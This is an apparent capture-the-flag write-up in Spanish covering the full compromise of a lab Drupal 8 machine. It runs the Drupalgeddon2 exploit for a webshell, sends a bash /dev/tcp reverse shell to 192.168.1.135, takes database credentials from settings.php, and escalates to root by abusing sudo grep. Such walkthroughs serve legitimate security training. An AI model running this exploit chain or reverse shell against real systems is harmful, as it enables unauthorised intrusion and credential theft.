PORT   STATE SERVICE
80/tcp open  http

-Vamos a la web y nos encontramos un Drupal 8

-Buscamos exploits en searchsploit:
	searchsploit drupal 8

-Encontramos estos 2 exploits que suben una webshell al servidor y podemos ejecutar comandos:
	-php/webapps/44448.py: NO FUNCIONA
	-php/webapps/44449.rb: SI FUNCIONA!!

-También podemos ganar acceso con el siguiente exploit de metasploit:
	-exploit/unix/webapp/drupal_drupalgeddon2 

-Usamos el exploit de ruby para ganar acceso a la máquina:
	-ruby 44449.rb http://172.17.0.2/:
		fc4fcfda7e9d>> whoami
		www-data
	-Nos mandamos una reverse shell para operar más cómodos:
		fc4fcfda7e9d>> bash -c 'bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261'

www-data@fc4fcfda7e9d:/$


## Escalada de Privilegios

-Somos el usuario www-data y no podemos ejecutar comandos como sudo

-Tampoco tenemos binarios SUID interesantes

-Buscamos archivos interesantes dentro de nuestro grupo:
	-find / -group www-data 2>/dev/null
	-Encontramos el siguiente archivo:
		cat /var/www/html/sites/default/settings.php

-Dentro de 'settings.php' encontramos la siguiente información relevante:
	$databases['default']['default'] = array (
	 *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
	 *   'username' => 'ballenita',
	 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
	 *   'host' => 'localhost',
	 *   'port' => '3306',
	 *   'driver' => 'mysql',
	 *   'prefix' => '',
	 *   'collation' => 'utf8mb4_general_ci',
	 * );

-Parece que la máquina no tiene instalado 'mysql' . Intentamos autenticarnos con el usuario ballenita:
	-su ballenita
	-password: ballenitafeliz

-Hemos logrado pivotar al usuario ballenita:
	ballenita@fc4fcfda7e9d:/$

-Vemos los comandos que puede ejecutar como sudo:
	-sudo -l:
		(root) NOPASSWD: /bin/ls, /bin/grep

-Podemos ejecutar como root los binarios 'ls' y 'grep'

-Utilizamos '/bin/ls' para listar el directorio /root:
	ballenita@fc4fcfda7e9d:/$ sudo /bin/ls /root
	secretitomaximo.txt

-Buscamos en Gtfobins el binario 'grep' y vemos que podemos ver el contenido de cualquier archivo de la siguiente forma:
	-LFILE=file_to_read
	-sudo grep '' $LFILE

-Utilizamos esto para ver el contenido del fichero 'secretitomaximo.txt':
	-LFILE=/root/secretitomaximo.txt
	-sudo grep '' $LFILE
	-Contenido: nobodycanfindthispasswordrootrocks

-Nos autenticamos como root con la contraseña obtenida:
	-su root
	-password: nobodycanfindthispasswordrootrocks

root@fc4fcfda7e9d:/# 

